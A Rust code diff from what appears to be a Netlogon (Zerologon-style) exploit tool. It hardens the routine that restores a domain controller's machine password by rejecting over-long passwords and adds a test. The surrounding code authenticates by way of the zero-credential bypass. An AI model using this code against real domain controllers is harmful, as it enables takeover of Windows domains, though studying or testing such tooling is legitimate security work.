@@ -181,18 +181,22 @@ pub async fn restore_password(
 /// Build an NL_TRUST_PASSWORD (516 bytes): the UTF-16LE password right-aligned in a 512-byte
 /// buffer (front is padding the server ignores) + a 4-byte byte-length. Restoring the CLEARTEXT
 /// (not just the OWF) makes AD regenerate every key — NT *and* the AES keys the schannel needs.
-fn nl_trust_password(password: &str) -> [u8; 516] {
+fn nl_trust_password(password: &str) -> Result<[u8; 516]> {
     let utf16: Vec<u8> = password
         .encode_utf16()
         .flat_map(|u| u.to_le_bytes())
         .collect();
-    // The buffer holds at most 512 bytes; clamp so an over-long cleartext can't underflow the slice
-    // (machine passwords are <= 120 chars in practice, so this never triggers for real secrets).
-    let len = utf16.len().min(512);
+    if utf16.len() > 512 {
+        return Err(RpcError::Protocol(format!(
+            "machine password is {} UTF-16LE bytes; NL_TRUST_PASSWORD permits at most 512",
+            utf16.len()
+        )));
+    }
+    let len = utf16.len();
     let mut buf = [0u8; 516];
-    buf[(512 - len)..512].copy_from_slice(&utf16[utf16.len() - len..]);
+    buf[(512 - len)..512].copy_from_slice(&utf16);
     buf[512..516].copy_from_slice(&(len as u32).to_le_bytes());
-    buf
+    Ok(buf)
 }
 
 /// Same NDR shape as [`encode_password_set2`] but carrying an already-encrypted 516-byte
@@ -224,6 +228,7 @@ pub async fn restore_password_cleartext(
     password: &str,
     max_attempts: u32,
 ) -> Result<bool> {
+    let trust_password = nl_trust_password(password)?;
     let port = epm::resolve_port(host, netlogon_syntax()).await?;
     let mut rpc = RpcTcp::connect(&format!("{host}:{port}")).await?;
     rpc.bind(netlogon_syntax()).await?;
@@ -241,7 +246,7 @@ pub async fn restore_password_cleartext(
             .await?;
         if ret_status(&auth) == STATUS_SUCCESS {
             let sk = session_key(&EMPTY_NT_OWF, &zero, &server_ch);
-            let enc = aes_cfb8_encrypt(&sk, &nl_trust_password(password));
+            let enc = aes_cfb8_encrypt(&sk, &trust_password);
             let mut enc_pw = [0u8; 516];
             enc_pw.copy_from_slice(&enc);
             let resp = rpc
@@ -367,5 +372,11 @@ mod tests {
     fn ret_status_reads_tail() {
         assert_eq!(ret_status(&[0, 0, 0, 0, 0, 0, 0, 0]), 0);
         assert_eq!(ret_status(&0xC000_0022u32.to_le_bytes()), 0xC000_0022);
+    }
+
+    #[test]
+    fn trust_password_rejects_overlong_cleartext() {
+        assert!(nl_trust_password(&"A".repeat(256)).is_ok());
+        assert!(nl_trust_password(&"A".repeat(257)).is_err());
     }
 }
